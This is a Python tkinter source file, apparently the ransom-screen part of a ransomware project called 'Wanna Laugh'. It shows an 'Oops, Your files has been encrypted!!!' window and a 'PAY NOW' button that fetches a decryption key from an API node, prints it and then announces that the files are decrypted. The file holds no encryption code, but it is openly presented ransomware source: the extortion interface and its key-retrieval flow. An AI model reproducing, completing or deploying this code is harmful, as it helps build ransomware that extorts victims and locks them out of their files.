import tkinter as tk
from PIL import ImageTk, Image
from services.api_services import ApiService

RED_BG = '#A0153E'
WHITE = '#EEEDED'
API_SERVICE = ApiService()

def pay_now():
  node = API_SERVICE.get_node()
  key = API_SERVICE.get_key(node=node)

  # child screen
  noti_screen = tk.Toplevel()

  ico = Image.open('assets/hacker.ico')
  ico_photo = ImageTk.PhotoImage(ico)

  noti_screen.iconphoto(False, ico_photo)

  noti_label = tk.Label(
    master=noti_screen,
    text='All your files have been decrypted!!!', 
    font=40, 
    width=30, 
    height=10, 
    bg=RED_BG, 
    fg=WHITE
  )
  noti_label.pack()
  print(key)


class MainFrame(tk.Frame):
  def __init__(self, master):
    super().__init__(
      master=master,
      bg=RED_BG
    )

class HomeScreen(tk.Tk):
  def __init__(self):
    super().__init__()
    self.title("Wanna Laugh")
    #self.geometry('800x500')
    self.resizable(False, False)

    main_frame = MainFrame(master=self)
    main_frame.pack(
      fill='both', 
      expand=True
    )

    # label thong bao 
    label = tk.Label(
      master=main_frame, 
      text='Oops, Your files has been encrypted!!!', 
      background=RED_BG, 
      foreground=WHITE,
      font=10
    )
    label.pack()


    # icon window
    ico = Image.open('assets/hacker.ico')
    ico_photo = ImageTk.PhotoImage(ico)
    self.iconphoto(False, ico_photo)


    # img label
    image_original = Image.open('assets/banner.png').resize((700, 500))
    self.image_tk = ImageTk.PhotoImage(image_original)

    label_image = tk.Label(master=main_frame, image=self.image_tk, bg=RED_BG)
    label_image.pack(expand=1, fill='both')

    # nut chuyen tien
    pay_btn = tk.Button(
      master=main_frame, 
      text='PAY NOW', 
      width=10, 
      height=5,
      borderwidth=1,
      bg=RED_BG,
      foreground=WHITE,
      font=15,
      command=pay_now,
    )
    pay_btn.pack()
    # Nút để mở cửa sổ phụ

